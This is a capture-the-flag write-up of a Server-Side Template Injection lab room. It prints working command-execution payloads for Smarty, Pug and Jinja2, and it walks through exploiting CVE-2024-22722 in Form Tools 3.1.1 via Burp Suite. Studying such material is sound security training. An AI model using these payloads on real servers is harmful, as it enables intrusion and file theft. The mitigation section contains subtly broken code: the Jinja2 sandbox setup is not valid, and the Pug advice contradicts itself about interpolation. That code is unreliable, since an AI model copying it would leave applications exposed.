<img width="1133" height="276" alt="image" src="https://github.com/user-attachments/assets/01640007-ec62-4470-bd54-d03bd540610d" />

# Server-Side Template Injection (SSTI)

## Task 1 - Introduction

Learned the basics of Server-Side Template Injection (SSTI) and how template engines can become vulnerable when user input is rendered insecurely.

Added the target machine to `/etc/hosts`:

```bash
10.49.132.98 ssti.thm
```

Accessed the target application through:

```text
http://ssti.thm
```
## Task 2 - What is SSTI?

Server-Side Template Injection (SSTI) is a vulnerability that occurs when user input is processed directly by a server-side template engine without proper sanitization.

Template engines are commonly used in web applications to generate dynamic content. If user-controlled input is rendered as part of the template, attackers may inject template expressions that are executed on the server.

This can lead to:
- Remote Code Execution (RCE)
- Sensitive data disclosure
- File read access
- Command execution
- Privilege escalation

---

## Example Payloads

```python
{{7*7}}
```

```python
${7*7}
```

If the application evaluates these expressions instead of displaying them as plain text, the target may be vulnerable to SSTI.

## Task 3 - Template Engines

Template engines are used to generate dynamic web content by combining templates with user-provided data.

They use placeholders such as:

```python
{{ name }}
```

which are replaced with actual values during rendering.

Example:

```python
from jinja2 import Template

hello_template = Template("Hello, {{ name }}!")
output = hello_template.render(name="World")

print(output)
```

Output:

```text
Hello, World!
```

Common template engines include:
- Jinja2 (Python)
- Twig (PHP)
- Pug/Jade (NodeJS)

In SSTI vulnerabilities, insecure handling of user input may allow attackers to inject template expressions that are executed by the server.

## Determining the Template Engine

Different template engines process expressions differently. Testing payload behavior can help identify the template engine used by the target application.

<img width="1391" height="474" alt="image" src="https://github.com/user-attachments/assets/7165050f-8de3-4ab7-a512-9f1120bb4b9c" />

### Jinja2 / Twig

Both Jinja2 and Twig use similar syntax:

```python
{{7*7}}
```

which returns:

```text
49
```

A better way to distinguish them is by testing string multiplication:

```python
{{7*'7'}}
```

Twig output:

```text
49
```

Jinja2 output:

```text
7777777
```

---

### Pug / Jade

Pug/Jade uses JavaScript expression syntax:

```javascript
#{7*7}
```

Output:

```text
49
```

Unlike Jinja2 or Twig, Pug/Jade directly evaluates JavaScript expressions inside `#{}`.

## Task 4 - PHP Smarty

Smarty is a PHP template engine used to separate application logic from presentation logic.

In this task, the target application was using Smarty and user input was being rendered by the template engine. This made it possible to test for SSTI.

### Testing for Smarty

<img width="1381" height="383" alt="image" src="https://github.com/user-attachments/assets/30b5f7a8-de97-4b7e-ab84-d3a38d3ec071" />

Payload used:

```smarty
{'Hello'|upper}
```

Output:

```text
HELLO
```

This confirmed that the input was being processed by Smarty.

### Command Execution

After confirming SSTI, I tested command execution using:

```smarty
{system("ls")}
```

This executed the `ls` command on the server and listed files in the current directory.

### Key Takeaway

If Smarty allows dangerous PHP functions inside templates, SSTI can lead to command execution on the server.

<img width="1352" height="379" alt="image" src="https://github.com/user-attachments/assets/d6338aa5-6231-49f9-82ee-4782ad494e0d" />

This listed files in the current directory and revealed a hidden text file.

What is the content of the hidden text file in the server directory?

I then used:

```smarty
{system("cat <filename>")}
```

to read the contents of the file and obtain the flag.

<img width="1355" height="392" alt="image" src="https://github.com/user-attachments/assets/e1c90503-4395-4ede-9a0f-3562588a39de" />


## Task 5 - NodeJS Pug

Pug, formerly known as Jade, is a template engine commonly used in NodeJS applications.

In this task, the target application was using Pug and user input was being processed inside the template engine. Since Pug supports JavaScript interpolation, unsafe user input can lead to SSTI and command execution.

### Testing for Pug

Payload used:

```javascript
#{7*7}
```

Output:

```text
49
```

This confirmed that the input was being evaluated by Pug.

### Command Execution

After confirming SSTI, NodeJS `child_process` was used to execute system commands.

Payload:

```javascript
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}
```

This executed the `ls` command and returned the directory contents.

### Why `spawnSync('ls -lah')` Does Not Work

`spawnSync()` does not automatically split a full command string into a command and arguments.

This means:

```javascript
spawnSync('ls -lah')
```

is treated as trying to run a program literally named:

```text
ls -lah
```

Since there is no program with that exact name, the command fails.

The correct format is to separate the command from its arguments:

```javascript
spawnSync('ls', ['-lah'])
```

In this format:

```text
ls
```

is the command, and:

```text
-lah
```

is passed as an argument.

Final payload:

```javascript
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
```

This executes `ls -lah` correctly and returns the output through `stdout`.

<img width="1360" height="387" alt="image" src="https://github.com/user-attachments/assets/fa6db5ba-9042-440c-a475-2a7390874d80" />


This listed all files, including hidden files in the current directory.

### Reading the Hidden File

After identifying the hidden text file, the following payload was used:

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['<filename>']).stdout}
```

<img width="1347" height="392" alt="image" src="https://github.com/user-attachments/assets/b09c52fe-e5e2-41a2-9d4e-6b4f0a6f248b" />



### Key Takeaway

Pug SSTI can become dangerous because JavaScript expressions can be evaluated inside templates. If attackers can access NodeJS modules such as `child_process`, they may execute system commands on the server.


## Task 6 - Python Jinja2

Jinja2 is a template engine commonly used in Python web applications.

In this task, the target application was using Jinja2 and user input was being evaluated inside the template engine. Since Jinja2 supports Python-like expressions inside `{{ }}`, insecure input handling can lead to SSTI.

### Testing for Jinja2

<img width="1348" height="371" alt="image" src="https://github.com/user-attachments/assets/1a4f2c56-5ebe-4d0f-9ffd-c88f708e0d50" />


Payload used:

```python
{{7*7}}
```

Output:

```text
49
```

This confirmed that the input was being evaluated by the template engine.

### Command Execution

After confirming SSTI, a payload was used to access Python internals and execute system commands through the `subprocess` module.

### Enumerating Python Classes

Before executing commands, the following payload can be used to list available Python subclasses:

```python
{{"".__class__.__mro__[1].__subclasses__()}}
```

<img width="1388" height="511" alt="image" src="https://github.com/user-attachments/assets/22145e05-8be4-4b6c-ab35-c904b90d7646" />
<img width="1412" height="238" alt="image" src="https://github.com/user-attachments/assets/0df892db-e0bd-4a8b-9250-ddb91490f986" />


This returns a list of classes available in the Python environment.

The index value used later, such as:

```python
__subclasses__()[157]
```

may vary depending on the target environment.

For example, `__subclasses__()[157]` may point to `subprocess.Popen` on one target, but reference a completely different class on another system.

Because of this, enumeration is important for identifying the correct class or object path before building the final payload.

Payload:

```python
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```
<img width="1386" height="403" alt="image" src="https://github.com/user-attachments/assets/aca4b185-3a71-469a-b7d0-383a90af6ec4" />

This payload executes the `ls` command and returns the command output.


### Why `check_output('ls -lah')` Does Not Work

`check_output()` does not automatically split a full command string into a command and arguments.

This means:

```python
check_output("ls -lah")
```

is treated as trying to run a program literally named:

```text
ls -lah
```

Since there is no program with that exact name, the command fails.

The correct format is to separate the command from its arguments using a list:

```python
check_output(["ls", "-lah"])
```

In this format:

```text
ls
```

is the command, and:

```text
-lah
```

is passed as an argument.

Final payload:

```python
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(["ls", "-lah"])}}
```

<img width="1369" height="451" alt="image" src="https://github.com/user-attachments/assets/0c8d2181-d8a5-40cf-b34e-c1a0578c3f07" />

This executes `ls -lah` correctly and returns the output.

### Reading the Hidden File

After identifying the hidden text file, the following format can be used:

```python
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(["cat", "<filename>"])}}
```

<img width="1376" height="399" alt="image" src="https://github.com/user-attachments/assets/8592ada9-e15f-4d4d-9f4a-62c85bfe5693" />



### Key Takeaway

Jinja2 SSTI can be exploited by accessing Python object internals and importing modules such as `subprocess`. If user input is rendered unsafely, attackers may execute system commands on the server.



## Task 7 - Automating the Exploitation

SSTImap is an automated SSTI exploitation tool used for detecting template injection vulnerabilities and identifying vulnerable template engines.

GitHub Repository:
https://github.com/vladko312/SSTImap

The tool supports multiple template engines and can automate exploitation techniques such as:
- Template engine detection
- Command execution
- File read and write
- Reverse shell capabilities
- Code evaluation

### Running SSTImap

Example command:

```bash
python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
```

<img width="1230" height="668" alt="image" src="https://github.com/user-attachments/assets/57ee5b5c-df2f-49b7-8108-88b019476b61" />



## Task 8 - Extra-Mile Challenge

The final challenge involved identifying and exploiting SSTI in another web application running on:

```text
http://ssti.thm:8080/
```

Credentials provided:

```text
Username: admin
Password: admin
```

<img width="1913" height="909" alt="image" src="https://github.com/user-attachments/assets/753e0bcb-f794-4d83-9f42-69cfee933c27" />


### Identifying the Vulnerability

Application fingerprinting revealed that the target was running Form Tools 3.1.1:

<img width="1394" height="631" alt="image" src="https://github.com/user-attachments/assets/bc2eef56-a022-4edb-83eb-ef118cdbcf26" />


Further research on the application version led to the discovery of:

```text
CVE-2024-22722
```
The vulnerability describes an SSTI issue in Form Tools 3.1.1, where arbitrary commands can be executed through the Group Name field.


<img width="1773" height="573" alt="image" src="https://github.com/user-attachments/assets/083b5d62-2e64-4479-a08c-8c8ec3e3db30" />



### SSTI Discovery

After logging into the application, SSTI testing was performed through the `Group Name` field under:

```text
Forms -> Views -> Add New Group
```
The following payload was used:

```python
{{7*'7'}}
```

Then we input the payload in the input field and updating the form, the application rendered:

```text
49
```

instead of displaying the payload as plain text.

<img width="1912" height="901" alt="image" src="https://github.com/user-attachments/assets/c2cabe04-0178-4f52-aec9-3cd4d519e906" />
<img width="1918" height="907" alt="image" src="https://github.com/user-attachments/assets/d32bb01d-e849-4d23-8dac-4ccdb02f9938" />

This confirmed that the `Group Name` field was processing template expressions, making it the SSTI injection point


Since the application was PHP-based and the vulnerable field was processing template expressions, command execution was tested using a PHP `system()` payload.

The request was intercepted and modified using Burp Suite.

Payload:

```php
{system("ls")}
```

<img width="1918" height="904" alt="image" src="https://github.com/user-attachments/assets/b58618c6-2f8a-4038-b720-7637278c7a44" />


In the response, the output of the `ls` command was returned inside the `View Group` field, displaying files from the server directory.

After confirming command execution with `ls`, additional commands were tested through the vulnerable `group_name` parameter.

Payload used:

```php
{system("whoami")}
```

The modified request was sent through Burp Suite Repeater.

The response returned:

```text
www-data
```

<img width="1281" height="541" alt="image" src="https://github.com/user-attachments/assets/8db56ffb-6ab6-4b22-8c4c-1920db1b15bf" />


### Enumerating Hidden Files

After confirming command execution, additional enumeration was performed using the `ls -la` command to display hidden files.

Since spaces and special characters were included in the payload, the command was URL-encoded using CyberChef before being inserted into the request.

Encoded command:

```text
ls%20-la%20../../../
```
<img width="1914" height="758" alt="image" src="https://github.com/user-attachments/assets/57cd3c2b-de47-4c61-8a3d-5042041fc028" />
<img width="1599" height="785" alt="image" src="https://github.com/user-attachments/assets/534004c0-a875-466c-ac53-1c0c0da4bec2" />

The encoded payload was then placed inside the vulnerable `group_name` parameter and sent through Burp Suite Repeater.

The response returned directory contents, including hidden files and a hidden text file in the server directory.

### Reading the Hidden File

After identifying the hidden text file, the `cat` command was used to read its contents.

Command used:

```bash
cat ../../../105e15924c1e41bf53ea64afa0fa72b2.txt
```

The command was URL-encoded using CyberChef before being inserted into the vulnerable parameter.

The modified request was then sent through Burp Suite Repeater to retrieve the contents of the hidden file.

<img width="1917" height="749" alt="image" src="https://github.com/user-attachments/assets/bf949c46-7a08-406e-a75d-6caa9c0510c6" />
<img width="1596" height="786" alt="image" src="https://github.com/user-attachments/assets/6de6947f-ae15-476e-bf51-45f6bb575119" />


## Task 9 - Mitigation

Server-Side Template Injection (SSTI) vulnerabilities can be prevented by securely handling user input and restricting dangerous template engine features.

### Jinja2

Mitigation methods for Jinja2 include:
- Enabling sandbox mode to restrict dangerous functions and attributes
- Sanitizing user input before rendering templates
- Avoiding direct insertion of user-controlled data into template expressions
- Regularly reviewing templates for insecure coding patterns

Example sandbox configuration:

```python
from jinja2 import Environment, select_autoescape, sandbox

env = Environment(
    autoescape=select_autoescape(['html', 'xml']),
    extensions=[sandbox.SandboxedEnvironment]
)
```

---

### Pug / Jade

Mitigation methods for Pug include:
- Avoiding direct JavaScript execution inside templates
- Validating and sanitizing all user input
- Avoiding dangerous unescaped interpolation such as `!{}`
- Using safer escaped interpolation like `#{}` whenever possible

Example:

```javascript
var user = !{JSON.stringify(user)}
h1= user.name
```

---

### Smarty

Mitigation methods for Smarty include:
- Disabling dangerous PHP execution inside templates
- Restricting insecure template functions
- Conducting regular security reviews
- Keeping Smarty updated with the latest security patches

Example configuration:

```php
$smarty->security_policy->php_handling = Smarty::PHP_REMOVE;
$smarty->disable_security = false;
```

---

### Sandboxing

Sandboxing helps reduce SSTI risks by limiting what template engines are allowed to execute.

Benefits of sandboxing include:
- Restricting dangerous functions and methods
- Preventing access to sensitive variables and server resources
- Blocking command execution and file operations

### Key Takeaway

The main cause of SSTI vulnerabilities is unsafe handling of user input inside templates. Proper input validation, sanitization, and secure template configurations are important for preventing SSTI attacks.


## What I Learned

From this room, I learned how SSTI vulnerabilities happen when user input is processed directly by template engines without proper sanitization.

I also learned:
- how to identify different template engines using payload behavior
- how SSTI can lead to command execution
- how to use Burp Suite to modify requests and test payloads
- basic enumeration using commands like `ls`, `pwd`, and `whoami`
- how mitigation methods such as sandboxing and input validation help prevent SSTI vulnerabilities







